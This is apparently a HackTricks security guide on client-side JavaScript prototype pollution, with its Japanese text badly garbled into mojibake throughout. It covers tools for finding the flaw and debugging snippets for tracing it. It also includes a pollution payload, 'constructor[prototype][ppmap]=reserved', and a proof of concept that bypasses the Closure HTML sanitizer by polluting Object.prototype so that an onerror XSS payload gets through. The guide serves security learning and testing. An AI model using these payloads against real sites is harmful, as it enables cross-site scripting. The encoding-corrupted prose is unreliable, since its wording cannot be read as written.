# ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„

</details>

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ç™ºè¦‹ã™ã‚‹

ãƒ„ãƒ¼ãƒ« [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ãŠã‚ˆã³** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) ã‚’ä½¿ç”¨ã—ã¦ **ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹** ã“ã¨ãŒã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½** [**PPScan**](https://github.com/msrkp/PPScan) ã‚’ä½¿ç”¨ã—ã¦ã€**ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãƒšãƒ¼ã‚¸**ã‚’ **è‡ªå‹•çš„ã«ã‚¹ã‚­ãƒ£ãƒ³** ã—ã¦ **ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§** ã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

### ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã‚’ãƒ‡ãƒãƒƒã‚°ã™ã‚‹ <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Prototype Pollutionã®æ ¹æœ¬åŸå› ã‚’è¦‹ã¤ã‘ã‚‹<a href="#5530" id="5530"></a>

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ãŒãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦ç‰¹å®šã•ã‚ŒãŸå ´åˆã€ã‚³ãƒ¼ãƒ‰ãŒéå¸¸ã«è¤‡é›‘ã§ãªã„é™ã‚Šã€Chrome Developer Toolsã§`location.hash`ã€`decodeURIComponent`ã€ã¾ãŸã¯`location.search`ãªã©ã®ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’æ¤œç´¢ã—ã¦è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã«ã‚ˆã‚Šã€JavaScriptã‚³ãƒ¼ãƒ‰ã®è„†å¼±ãªã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç‰¹å®šã§ãã¾ã™ã€‚

ã‚ˆã‚Šå¤§è¦æ¨¡ã§è¤‡é›‘ãªã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã®å ´åˆã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã®ç›´æ¥çš„ãªæ–¹æ³•ã¯ã€æ¬¡ã®æ‰‹é †ã«å¾“ã†ã“ã¨ã§ã™ï¼š

1. ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è„†å¼±æ€§ã‚’ç‰¹å®šã—ã€ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿å†…ã§ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¨­å®šã™ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã¾ã™ã€‚ppmapã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹ä¾‹ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`constructor[prototype][ppmap]=reserved`ã€‚
2. ãƒšãƒ¼ã‚¸ã§æœ€åˆã«å®Ÿè¡Œã•ã‚Œã‚‹JavaScriptã‚³ãƒ¼ãƒ‰ã®æœ€åˆã®è¡Œã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¨­å®šã—ã¾ã™ã€‚ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒšãƒ¼ã‚¸ã‚’ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ã—ã€ã“ã®ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã§å®Ÿè¡Œã‚’ä¸€æ™‚åœæ­¢ã—ã¾ã™ã€‚
3. JavaScriptã®å®Ÿè¡ŒãŒä¸€æ™‚åœæ­¢ã•ã‚Œã¦ã„ã‚‹é–“ã«ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’JSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€'ppmap'ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒä½œæˆã•ã‚ŒãŸã¨ãã«ã‚·ã‚°ãƒŠãƒ«ã‚’é€ä¿¡ã—ã€ãã®èµ·æºã‚’ç‰¹å®šã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ï¼š
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **Sources**ã‚¿ãƒ–ã«æˆ»ã‚Šã€ã€Œã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’å†é–‹ã€ã‚’é¸æŠã—ã¾ã™ã€‚JavaScriptã¯å®Ÿè¡Œã‚’ç¶šè¡Œã—ã€ã€Œppmapã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒæœŸå¾…é€šã‚Šã«æ±šæŸ“ã•ã‚Œã¾ã™ã€‚æä¾›ã•ã‚ŒãŸã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€ã€Œppmapã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒæ±šæŸ“ã•ã‚ŒãŸæ­£ç¢ºãªå ´æ‰€ã‚’ç‰¹å®šã§ãã¾ã™ã€‚**Call Stack**ã‚’èª¿ã¹ã‚‹ã“ã¨ã§ã€æ±šæŸ“ãŒç™ºç”Ÿã—ãŸç•°ãªã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’è¦³å¯Ÿã§ãã¾ã™ã€‚

èª¿æŸ»ã™ã¹ãã‚¹ã‚¿ãƒƒã‚¯ã‚’æ±ºå®šã™ã‚‹éš›ã«ã¯ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ãŒé »ç¹ã«ç™ºç”Ÿã™ã‚‹JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã«é–¢é€£ã™ã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’å¯¾è±¡ã«ã™ã‚‹ã“ã¨ãŒã—ã°ã—ã°å½¹ç«‹ã¡ã¾ã™ã€‚ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸã‚¹ã‚¿ãƒƒã‚¯ã‚’ç‰¹å®šã™ã‚‹ã«ã¯ã€å³å´ã«è¡¨ç¤ºã•ã‚Œã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã«é–¢ã™ã‚‹æƒ…å ±ã‚’èª¿ã¹ã¾ã™ï¼ˆã‚¬ã‚¤ãƒ€ãƒ³ã‚¹ã¨ã—ã¦æä¾›ã•ã‚ŒãŸç”»åƒã¨åŒæ§˜ï¼‰ã€‚è¡Œ4ã¨6ãªã©è¤‡æ•°ã®ã‚¹ã‚¿ãƒƒã‚¯ãŒã‚ã‚‹å ´åˆã€åˆæœŸã®æ±šæŸ“ç™ºç”Ÿã‚’è¡¨ã™è¡Œ4ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚’é¸æŠã™ã‚‹ã®ãŒè«–ç†çš„ãªé¸æŠè‚¢ã§ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«ç§»å‹•ã—ã¾ã™ã€‚

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ¤œç´¢

ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã€**PPã®è„†å¼±æ€§ãŒç™ºè¦‹ã•ã‚ŒãŸéš›ã«æ‚ªç”¨ã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰**ã§ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚·ãƒ³ãƒ—ãƒ«ãªå ´åˆã€**`srcdoc/innerHTML/iframe/createElement`**ãªã©ã®**ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰**ã‚’**æ¤œç´¢**ã—ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã¦**JavaScriptã®å®Ÿè¡Œã«ã¤ãªãŒã‚‹ã‹ã©ã†ã‹**ã‚’ãƒã‚§ãƒƒã‚¯ã§ãã¾ã™ã€‚æ™‚ã«ã¯ã€ã“ã‚Œã‚‰ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒå…¨ãã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã„ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€ç´”ç²‹ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ãƒ¬ãƒ“ãƒ¥ãƒ¼ã«ã‚ˆã£ã¦ã€ä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ãªç´ æ•µãªã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒæ˜ã‚‰ã‹ã«ãªã‚Šã¾ã™ã€‚

### Mithilãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚³ãƒ¼ãƒ‰ã§ã®PPã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ç™ºè¦‹ä¾‹

ã“ã®è§£èª¬ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPã‚’ä»‹ã—ãŸHTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ã®å›é¿

[**ã“ã®ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)ã¯ã€ä¸€éƒ¨ã®HTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹**ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã‚’ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹PPã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç¤ºã—ã¦ã„ã¾ã™:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒæ–‡çŒ®

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* **HackTricks**ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
